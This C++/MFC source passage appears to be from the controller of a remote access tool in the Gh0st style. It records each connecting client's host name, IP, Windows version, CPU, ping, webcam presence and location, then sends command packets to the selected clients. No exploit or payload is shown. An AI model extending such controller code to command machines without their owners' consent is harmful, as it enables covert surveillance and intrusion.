		strIP = IPAddress;

		// 内网IP
		//m_pListCtrl->SetItemText(i, 2, inet_ntoa(LoginInfo->IPAddress));
		//strAddr=inet_ntoa(LoginInfo->IPAddress);
		// 主机名
		//m_pListCtrl->SetItemText(i, 3, LoginInfo->HostName);
		strPCName = LoginInfo->HostName;
		// 系统

		////////////////////////////////////////////////////////////////////////////////////////
		// 显示输出信息
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{

		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4)
				pszOS = "NT";
			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0)
				pszOS = "2000";
			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1)
				pszOS = "XP";
			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2)
				pszOS = "2003";
			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0)
				pszOS = "Vista";  // Just Joking
		}
		strOS.Format
		(
			"%s SP%d (Build %d)",
			//OsVerInfo.szCSDVersion,
			pszOS,
			LoginInfo->OsVerInfoEx.wServicePackMajor,
			LoginInfo->OsVerInfoEx.dwBuildNumber
		);
		//m_pListCtrl->SetItemText(i, 4, strOS);

		// CPU
		strCPU.Format("%dMHz", LoginInfo->CPUClockMhz);
		//m_pListCtrl->SetItemText(i, 5, str);

		// Speed
		strPing.Format("%d", LoginInfo->dwSpeed);
		//m_pListCtrl->SetItemText(i, 6, str);


		strVideo = LoginInfo->bIsWebCam ? "有" : "--";
		//m_pListCtrl->SetItemText(i, 7, str);

		strToolTipsText.Format("New Connection Information:\nHost: %s\nIP  : %s\nOS  : Windows %s", LoginInfo->HostName, IPAddress, strOS);

		if (((CPCRemoteApp *)AfxGetApp())->m_bIsQQwryExist)
		{

			strAddr = m_QQwry->IPtoAdd(IPAddress);

			//strToolTipsText += "\nArea: ";
			//strToolTipsText += str;
		}
		// 指定唯一标识
		//m_pListCtrl->SetItemData(i, (DWORD) pContext);    //这里将服务端的套接字等信息加入列表中保存
		AddList(strIP, strAddr, strPCName, strOS, strCPU, strVideo, strPing, pContext);
	}
	catch (...) {}

	return 0;
}



void CPCRemoteDlg::SendSelectCommand(PBYTE pData,UINT nSize)
{
	// TODO: 在此处添加实现代码.
	POSITION pos = m_CList_OnLine.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_CList_OnLine.GetNextSelectedItem(pos);                          //lang2.1_2
		ClientContext* pContext = (ClientContext*)m_CList_OnLine.GetItemData(nItem); //从列表条目中取出ClientContext结构体
		// 发送获得驱动器列表数据包                                                 //查看  ClientContext结构体
		m_iocpServer->Send(pContext, pData, nSize);      //调用  m_iocpServer  的Send 函数发送数据  查看m_iocpServer 定义

		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
}


